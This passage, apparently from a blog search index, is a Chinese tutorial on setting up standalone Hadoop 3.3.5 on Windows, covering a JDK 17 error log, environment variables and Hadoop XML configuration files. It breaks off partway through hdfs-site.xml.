<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hadoop部署</title>
    <url>/2023/10/15/01-34-22/</url>
    <content><![CDATA[<p>Hadoop的部署步骤（暂时仅有win版单机部署）<br>
首先声明：对于大多数错误，首先确认JDK和Hadoop版本，然后才是winutils版本、配置信息。我默认你能看懂输出和报错。</p>
<span id="more"></span>
<h2 id="下载jdk和hadoop"><a class="markdownIt-Anchor" href="#下载jdk和hadoop"></a> 下载JDK和Hadoop</h2>
<p>本文使用JDK11和Hadoop3.3.5，后面不再说明。之前使用了JDK17，但是在运行时报错很多，最后卡在了这里无法解决：</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"> ERROR nodemanager<span class="token punctuation">.</span>NodeManager<span class="token operator">:</span> Error starting NodeManager
java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ExceptionInInitializerError
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>$FastClassEmitter<span class="token punctuation">.</span><span class="token operator">&lt;</span>init<span class="token operator">&gt;</span><span class="token punctuation">(</span>FastClassEmitter<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">67</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>$FastClass$Generator<span class="token punctuation">.</span><span class="token function">generateClass</span><span class="token punctuation">(</span>FastClass<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">72</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>$DefaultGeneratorStrategy<span class="token punctuation">.</span><span class="token function">generate</span><span class="token punctuation">(</span>DefaultGeneratorStrategy<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>$AbstractClassGenerator<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>AbstractClassGenerator<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">216</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>$FastClass$Generator<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>FastClass<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">64</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>BytecodeGen<span class="token punctuation">.</span><span class="token function">newFastClass</span><span class="token punctuation">(</span>BytecodeGen<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">204</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>ProviderMethod$FastClassProviderMethod<span class="token punctuation">.</span><span class="token operator">&lt;</span>init<span class="token operator">&gt;</span><span class="token punctuation">(</span>ProviderMethod<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">256</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>ProviderMethod<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>ProviderMethod<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">71</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>ProviderMethodsModule<span class="token punctuation">.</span><span class="token function">createProviderMethod</span><span class="token punctuation">(</span>ProviderMethodsModule<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">275</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>ProviderMethodsModule<span class="token punctuation">.</span><span class="token function">getProviderMethods</span><span class="token punctuation">(</span>ProviderMethodsModule<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">144</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>ProviderMethodsModule<span class="token punctuation">.</span><span class="token function">configure</span><span class="token punctuation">(</span>ProviderMethodsModule<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">123</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>spi<span class="token punctuation">.</span>Elements$RecordingBinder<span class="token punctuation">.</span><span class="token function">install</span><span class="token punctuation">(</span>Elements<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">340</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>spi<span class="token punctuation">.</span>Elements$RecordingBinder<span class="token punctuation">.</span><span class="token function">install</span><span class="token punctuation">(</span>Elements<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">349</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>AbstractModule<span class="token punctuation">.</span><span class="token function">install</span><span class="token punctuation">(</span>AbstractModule<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">122</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>ServletModule<span class="token punctuation">.</span><span class="token function">configure</span><span class="token punctuation">(</span>ServletModule<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">52</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>AbstractModule<span class="token punctuation">.</span><span class="token function">configure</span><span class="token punctuation">(</span>AbstractModule<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">62</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>spi<span class="token punctuation">.</span>Elements$RecordingBinder<span class="token punctuation">.</span><span class="token function">install</span><span class="token punctuation">(</span>Elements<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">340</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>spi<span class="token punctuation">.</span>Elements<span class="token punctuation">.</span><span class="token function">getElements</span><span class="token punctuation">(</span>Elements<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">110</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>InjectorShell$Builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>InjectorShell<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">138</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>InternalInjectorCreator<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>InternalInjectorCreator<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">104</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>Guice<span class="token punctuation">.</span><span class="token function">createInjector</span><span class="token punctuation">(</span>Guice<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">96</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>Guice<span class="token punctuation">.</span><span class="token function">createInjector</span><span class="token punctuation">(</span>Guice<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">73</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>Guice<span class="token punctuation">.</span><span class="token function">createInjector</span><span class="token punctuation">(</span>Guice<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">62</span><span class="token punctuation">)</span>
        at org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>yarn<span class="token punctuation">.</span>webapp<span class="token punctuation">.</span>WebApps$Builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>WebApps<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">417</span><span class="token punctuation">)</span>
        at org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>yarn<span class="token punctuation">.</span>webapp<span class="token punctuation">.</span>WebApps$Builder<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span>WebApps<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">465</span><span class="token punctuation">)</span>
        at org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>yarn<span class="token punctuation">.</span>webapp<span class="token punctuation">.</span>WebApps$Builder<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span>WebApps<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">461</span><span class="token punctuation">)</span>
        at org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>yarn<span class="token punctuation">.</span>server<span class="token punctuation">.</span>nodemanager<span class="token punctuation">.</span>webapp<span class="token punctuation">.</span>WebServer<span class="token punctuation">.</span><span class="token function">serviceStart</span><span class="token punctuation">(</span>WebServer<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">125</span><span class="token punctuation">)</span>
        at org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>service<span class="token punctuation">.</span>AbstractService<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span>AbstractService<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">194</span><span class="token punctuation">)</span>
        at org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>service<span class="token punctuation">.</span>CompositeService<span class="token punctuation">.</span><span class="token function">serviceStart</span><span class="token punctuation">(</span>CompositeService<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">122</span><span class="token punctuation">)</span>
        at org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>service<span class="token punctuation">.</span>AbstractService<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span>AbstractService<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">194</span><span class="token punctuation">)</span>
        at org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>yarn<span class="token punctuation">.</span>server<span class="token punctuation">.</span>nodemanager<span class="token punctuation">.</span>NodeManager<span class="token punctuation">.</span><span class="token function">initAndStartNodeManager</span><span class="token punctuation">(</span>NodeManager<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">963</span><span class="token punctuation">)</span>
        at org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>yarn<span class="token punctuation">.</span>server<span class="token punctuation">.</span>nodemanager<span class="token punctuation">.</span>NodeManager<span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span>NodeManager<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1042</span><span class="token punctuation">)</span>
Caused by<span class="token operator">:</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InaccessibleObjectException<span class="token operator">:</span> Unable to make <span class="token keyword">protected</span> <span class="token keyword">final</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Class java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ClassLoader<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>String<span class="token punctuation">,</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">,</span>java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>ProtectionDomain<span class="token punctuation">)</span> throws java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ClassFormatError accessible<span class="token operator">:</span> <span class="token keyword">module</span> <span class="token module">java<span class="token punctuation">.</span>base</span> does <span class="token operator">not</span> <span class="token string">"opens java.lang"</span> to unnamed <span class="token keyword">module</span> @<span class="token number">6025e1</span>b6
        at java<span class="token punctuation">.</span>base<span class="token operator">/</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>AccessibleObject<span class="token punctuation">.</span><span class="token function">checkCanSetAccessible</span><span class="token punctuation">(</span>AccessibleObject<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">354</span><span class="token punctuation">)</span>
        at java<span class="token punctuation">.</span>base<span class="token operator">/</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>AccessibleObject<span class="token punctuation">.</span><span class="token function">checkCanSetAccessible</span><span class="token punctuation">(</span>AccessibleObject<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">297</span><span class="token punctuation">)</span>
        at java<span class="token punctuation">.</span>base<span class="token operator">/</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">.</span><span class="token function">checkCanSetAccessible</span><span class="token punctuation">(</span>Method<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">199</span><span class="token punctuation">)</span>
        at java<span class="token punctuation">.</span>base<span class="token operator">/</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span>Method<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">193</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>$ReflectUtils$<span class="token number">2.</span><span class="token function">run</span><span class="token punctuation">(</span>ReflectUtils<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">56</span><span class="token punctuation">)</span>
        at java<span class="token punctuation">.</span>base<span class="token operator">/</span>java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span>AccessController<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">318</span><span class="token punctuation">)</span>
        at com<span class="token punctuation">.</span>google<span class="token punctuation">.</span>inject<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>cglib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>$ReflectUtils<span class="token punctuation">.</span><span class="token operator">&lt;</span>clinit<span class="token operator">&gt;</span><span class="token punctuation">(</span>ReflectUtils<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">46</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token number">32</span> more
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">882</span> INFO ipc<span class="token punctuation">.</span>Server<span class="token operator">:</span> Stopping server on <span class="token number">8122</span>
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">882</span> INFO ipc<span class="token punctuation">.</span>Server<span class="token operator">:</span> Stopping IPC Server listener on <span class="token number">0</span>
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">882</span> INFO ipc<span class="token punctuation">.</span>Server<span class="token operator">:</span> Stopping IPC Server Responder
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">883</span> WARN monitor<span class="token punctuation">.</span>ContainersMonitorImpl<span class="token operator">:</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>yarn<span class="token punctuation">.</span>server<span class="token punctuation">.</span>nodemanager<span class="token punctuation">.</span>containermanager<span class="token punctuation">.</span>monitor<span class="token punctuation">.</span>ContainersMonitorImpl is interrupted<span class="token punctuation">.</span> Exiting<span class="token punctuation">.</span>
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">889</span> INFO ipc<span class="token punctuation">.</span>Server<span class="token operator">:</span> Stopping server on <span class="token number">8040</span>
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">890</span> INFO ipc<span class="token punctuation">.</span>Server<span class="token operator">:</span> Stopping IPC Server listener on <span class="token number">8040</span>
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">890</span> INFO ipc<span class="token punctuation">.</span>Server<span class="token operator">:</span> Stopping IPC Server Responder
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">890</span> WARN nodemanager<span class="token punctuation">.</span>NodeResourceMonitorImpl<span class="token operator">:</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>yarn<span class="token punctuation">.</span>server<span class="token punctuation">.</span>nodemanager<span class="token punctuation">.</span>NodeResourceMonitorImpl is interrupted<span class="token punctuation">.</span> Exiting<span class="token punctuation">.</span>
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">890</span> INFO localizer<span class="token punctuation">.</span>ResourceLocalizationService<span class="token operator">:</span> Public cache exiting
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">891</span> INFO impl<span class="token punctuation">.</span>MetricsSystemImpl<span class="token operator">:</span> Stopping NodeManager metrics system<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">892</span> INFO impl<span class="token punctuation">.</span>MetricsSystemImpl<span class="token operator">:</span> NodeManager metrics system stopped<span class="token punctuation">.</span>
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">892</span> INFO impl<span class="token punctuation">.</span>MetricsSystemImpl<span class="token operator">:</span> NodeManager metrics system shutdown complete<span class="token punctuation">.</span>
<span class="token number">2023</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">15</span><span class="token operator">:</span><span class="token number">56</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">893</span> INFO nodemanager<span class="token punctuation">.</span>NodeManager<span class="token operator">:</span> SHUTDOWN_MSG<span class="token operator">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>大概就是guice包用到的反射机制在JDK17被限制了，我尝试添加jvm参数：<code>--add-opens java.base/java.lang=ALL-UNNAMED</code>也没用，同时JDK17也取消了<code>--illegal-access=permit</code>的使用。目前我暂时没找到如何在JDK17上运行Hadoop。</p>
<h2 id="下载winutils"><a class="markdownIt-Anchor" href="#下载winutils"></a> 下载winutils</h2>
<p>下载对应自己Hadoop版本的<a href="https://github.com/cdarlint/winutils">winutils</a></p>
<h2 id="添加环境变量"><a class="markdownIt-Anchor" href="#添加环境变量"></a> 添加环境变量</h2>
<p>添加HADOOP_HOME和HADOOP_SUER_NAME配置</p>
<ul>
<li>HADOOP_NAME=“你的Hadoop存放目录，例如D:/envs/hadoop-3.3.5”</li>
<li>HADOOP_SUER_NAME=“root”</li>
<li>JAVA_HOME=“你的JDK路径”，如果你本来就有JDK，但是版本是17这些高版本，也不需要修改，具体看后面操作。</li>
</ul>
<p>在path中添加：</p>
<ul>
<li>%JAVA_HOME%\bin</li>
<li>%JAVA_HOME%\jre\bin</li>
<li>%HADOOP_HOME%\bin</li>
<li>%HADOOP_HOME%\sbin</li>
</ul>
<h2 id="检测是否安装成功"><a class="markdownIt-Anchor" href="#检测是否安装成功"></a> 检测是否安装成功</h2>
<p>命令行运行如下命令：</p>
<p><code>java -version</code><br>
<code>hadoop version</code></p>
<p>应当形如：</p>
<img src="/images/posts/pi9GJz9.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/15/pi9GJz9.png'">
<h2 id="修改一些hadoop配置文件"><a class="markdownIt-Anchor" href="#修改一些hadoop配置文件"></a> 修改一些Hadoop配置文件</h2>
<p><strong>etc/hadoop文件夹中</strong></p>
<h3 id="core-sitexml"><a class="markdownIt-Anchor" href="#core-sitexml"></a> core-site.xml</h3>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>fs.defaultFS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token comment">&lt;!-- 使用localhost来指定你的本机 --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>hdfs://localhost:9000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>hadoop.tmp.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token comment">&lt;!-- 保证此目录存在且具有适当的权限 --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/D:/envs/hadoop-3.3.5/tmp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>hadoop.http.staticuser.user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token comment">&lt;!-- 使用root可能不是最佳做法，除非你有明确的原因这样做。考虑使用普通用户帐号 --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="mapreduce-sitexml"><a class="markdownIt-Anchor" href="#mapreduce-sitexml"></a> mapreduce-site.xml</h3>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>mapreduce.framework.name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>yarn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="hdfs-sitexml"><a class="markdownIt-Anchor" href="#hdfs-sitexml"></a> hdfs-site.xml</h3>
<p>在Hadoop目录下创建data目录<br>
在刚才创建的data目录下创建namenode目录</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>
  <span class="token comment">&lt;!-- 这个参数设置为1，因为是单机版hadoop --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>dfs.replication <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>dfs.permissions<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
